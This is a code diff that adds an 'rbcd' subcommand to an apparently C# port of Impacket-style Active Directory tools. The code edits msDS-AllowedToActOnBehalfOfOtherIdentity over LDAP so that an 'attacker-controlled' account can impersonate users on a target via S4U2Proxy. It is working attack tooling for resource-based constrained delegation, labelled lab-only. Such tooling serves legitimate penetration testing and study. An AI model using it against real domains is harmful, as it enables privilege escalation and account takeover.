@@ -1204,6 +1204,193 @@ switch (args[0])
         return res.Success ? 0 : 1;
     }
 
+    case "rbcd":
+    {
+        // rbcd.py: read/edit msDS-AllowedToActOnBehalfOfOtherIdentity (Resource-Based Constrained
+        // Delegation). The attribute holds a security descriptor whose DACL lists the SIDs allowed
+        // to act on behalf of other identities against the target (via S4U2Proxy).
+        //   read   — list the accounts currently allowed to act on the target.
+        //   write  — add an allow ACE (FullControl 0xF01FF) for <delegate-from>'s SID.
+        //   remove — drop ACEs matching <delegate-from>'s SID.
+        //   flush  — clear the attribute entirely.
+        // Unlike dacledit/owneredit this is a plain attribute, so there is NO SD-flags control.
+        // LAB-ONLY (the delegation primitive for a Kerberos RBCD attack); see docs.
+        if (args.Length < 7)
+        {
+            Console.Error.WriteLine("usage: rbcd <read|write|remove|flush> <host> <user> <password> <domain-fqdn> <delegate-to> [delegate-from]");
+            Console.Error.WriteLine("  delegate-to   : the target account whose rbcd property is read/edited (a computer account ends in $)");
+            Console.Error.WriteLine("  delegate-from : the attacker-controlled account to grant (write/remove)");
+            Console.Error.WriteLine("  e.g. rbcd read  127.0.0.1 Administrator 'LabAdm1n!Pass' lab.local 'VICTIM$'");
+            Console.Error.WriteLine("       rbcd write 127.0.0.1 Administrator 'LabAdm1n!Pass' lab.local 'VICTIM$' 'ATTACKER$'");
+            return 2;
+        }
+
+        string action = args[1];
+        string host = args[2];
+        string user = args[3];
+        string password = args[4];
+        string domainFqdn = args[5];
+        string delegateTo = args[6];
+        string delegateFrom = args.Length > 7 ? args[7] : string.Empty;
+        string baseDn = "dc=" + domainFqdn.Replace(".", ",dc=");
+        string bindName = user.Contains('@') ? user : $"{user}@{domainFqdn}";
+        const string RbcdAttr = "msDS-AllowedToActOnBehalfOfOtherIdentity";
+
+        using LdapConnection ldap = LdapConnection.Connect(host, 389);
+        LdapBindResponse bind = ldap.SimpleBind(bindName, password);
+        if (!bind.Success)
+        {
+            Console.Error.WriteLine($"Bind failed (result {bind.ResultCode}): {bind.DiagnosticMessage}");
+            return 1;
+        }
+
+        // sAMAccountName -> (DN, SID).
+        (string Dn, string Sid) GetUserInfo(string sam)
+        {
+            IReadOnlyList<SearchEntry> es = ldap.Search(baseDn,
+                LdapFilter.AllOf(LdapFilter.PresentOf("objectClass"), LdapFilter.Equal("sAMAccountName", sam)),
+                new[] { "distinguishedName", "objectSid" });
+            if (es.Count == 0)
+            {
+                return (string.Empty, string.Empty);
+            }
+
+            byte[]? sidRaw = es[0].GetRaw("objectSid");
+            return (es[0].Get("distinguishedName"), sidRaw is null ? string.Empty : LdapSid.ToCanonical(sidRaw));
+        }
+
+        string ResolveName(string sidString)
+        {
+            IReadOnlyList<SearchEntry> es = ldap.Search(baseDn,
+                LdapFilter.EqualRaw("objectSid", LdapSid.FromCanonical(sidString)), new[] { "sAMAccountName" });
+            string name = es.Count > 0 ? es[0].Get("sAMAccountName") : string.Empty;
+            return string.IsNullOrEmpty(name) ? sidString : name;
+        }
+
+        (string dn, string _) = GetUserInfo(delegateTo);
+        if (string.IsNullOrEmpty(dn))
+        {
+            Console.Error.WriteLine($"Account to modify does not exist: {delegateTo} (computer accounts end in $)");
+            return 1;
+        }
+
+        // BASE-read the target's current rbcd attribute; build its SD (or an empty one if absent).
+        NtSecurityDescriptor ReadSd()
+        {
+            IReadOnlyList<SearchEntry> es = ldap.Search(dn,
+                LdapFilter.PresentOf("objectClass"), new[] { RbcdAttr }, LdapSearchScope.BaseObject);
+            byte[]? raw = es.Count > 0 ? es[0].GetRaw(RbcdAttr) : null;
+            if (raw is { Length: > 0 })
+            {
+                return NtSecurityDescriptor.Parse(raw);
+            }
+
+            // create_empty_sd(): Control 0x8004, owner BUILTIN\Administrators, empty DACL.
+            return new NtSecurityDescriptor
+            {
+                Control = 0x8004,
+                OwnerSid = LdapSid.FromCanonical("S-1-5-32-544"),
+                Dacl = new NtAcl(),
+            };
+        }
+
+        void PrintAllowed(NtSecurityDescriptor sd)
+        {
+            List<NtAce> aces = sd.Dacl?.Aces ?? new List<NtAce>();
+            if (aces.Count == 0)
+            {
+                Console.WriteLine("  msDS-AllowedToActOnBehalfOfOtherIdentity is empty.");
+                return;
+            }
+
+            Console.WriteLine("  Accounts allowed to act on behalf of other identity:");
+            foreach (NtAce ace in aces)
+            {
+                string s = LdapSid.ToCanonical(ace.Sid);
+                Console.WriteLine($"    {ResolveName(s),-20} ({s})");
+            }
+        }
+
+        Console.WriteLine($"Target: {dn}");
+
+        if (action is "read")
+        {
+            PrintAllowed(ReadSd());
+            return 0;
+        }
+
+        if (action is "flush")
+        {
+            LdapResult res = ldap.ModifyReplace(dn, RbcdAttr, Array.Empty<byte[]>());
+            Console.WriteLine(res.Success
+                ? "[+] Delegation rights flushed."
+                : $"[-] Modify failed (result {res.ResultCode}): {res.DiagnosticMessage}");
+            return res.Success ? 0 : 1;
+        }
+
+        // write / remove need delegate-from.
+        if (string.IsNullOrEmpty(delegateFrom))
+        {
+            Console.Error.WriteLine($"'{action}' needs a <delegate-from> account.");
+            return 2;
+        }
+
+        (string _, string fromSid) = GetUserInfo(delegateFrom);
+        if (string.IsNullOrEmpty(fromSid))
+        {
+            Console.Error.WriteLine($"Account to escalate does not exist: {delegateFrom}");
+            return 1;
+        }
+
+        NtSecurityDescriptor sd = ReadSd();
+        sd.Dacl ??= new NtAcl();
+
+        if (action is "write")
+        {
+            if (sd.Dacl.Aces.Exists(a => LdapSid.ToCanonical(a.Sid) == fromSid))
+            {
+                Console.WriteLine($"{delegateFrom} ({fromSid}) can already act on behalf of {delegateTo}. Not modifying.");
+                return 0;
+            }
+
+            sd.Dacl.Aces.Add(new NtAce
+            {
+                AceType = NtAce.AccessAllowed,
+                Mask = 983551, // 0xF01FF full control, as rbcd.create_allow_ace
+                Sid = LdapSid.FromCanonical(fromSid),
+            });
+            LdapResult res = ldap.ModifyReplace(dn, RbcdAttr, new[] { sd.GetData() });
+            if (res.Success)
+            {
+                Console.WriteLine($"[+] {delegateFrom} ({fromSid}) can now impersonate users on {delegateTo} via S4U2Proxy.");
+                PrintAllowed(ReadSd());
+                return 0;
+            }
+
+            Console.Error.WriteLine($"[-] Modify failed (result {res.ResultCode}): {res.DiagnosticMessage}");
+            return 1;
+        }
+
+        if (action is "remove")
+        {
+            int removed = sd.Dacl.Aces.RemoveAll(a => LdapSid.ToCanonical(a.Sid) == fromSid);
+            if (removed == 0)
+            {
+                Console.WriteLine($"{delegateFrom} ({fromSid}) is not in the list. Nothing to remove.");
+                return 0;
+            }
+
+            LdapResult res = ldap.ModifyReplace(dn, RbcdAttr, new[] { sd.GetData() });
+            Console.WriteLine(res.Success
+                ? $"[+] Removed {delegateFrom} ({fromSid}) from the delegation list."
+                : $"[-] Modify failed (result {res.ResultCode}): {res.DiagnosticMessage}");
+            return res.Success ? 0 : 1;
+        }
+
+        Console.Error.WriteLine($"Unknown action '{action}' (use read|write|remove|flush).");
+        return 2;
+    }
+
     case "get-adcomputers":
     {
         // GetADComputers.py: LDAP-search a DC for all computer objects and print
@@ -4388,6 +4575,7 @@ static void PrintUsage()
     Console.WriteLine("  mssql-cbt <host> [port]   # checkMSSQLStatus: TDS PRELOGIN encryption posture (channel-binding precondition)");
     Console.WriteLine("  dacledit <read|write|remove|backup|restore> <host> <user> <password> <domain-fqdn> <target> [principal] [rights] [ace-type] [file]   # dacledit: read/edit an object's DACL (lab)");
     Console.WriteLine("  owneredit <read|write> <host> <user> <password> <domain-fqdn> <target> [new-owner]   # owneredit: read/set an object's owner (lab)");
+    Console.WriteLine("  rbcd <read|write|remove|flush> <host> <user> <password> <domain-fqdn> <delegate-to> [delegate-from]   # rbcd: msDS-AllowedToActOnBehalfOfOtherIdentity (lab)");
     Console.WriteLine("  rpc-services <host> <user> <password> [domain] [port]");
     Console.WriteLine("                   List installed services via svcctl REnumServicesStatusW (services.py list).");
     Console.WriteLine("  rpc-svcconfig <host> <user> <password> <service> [domain] [port]");
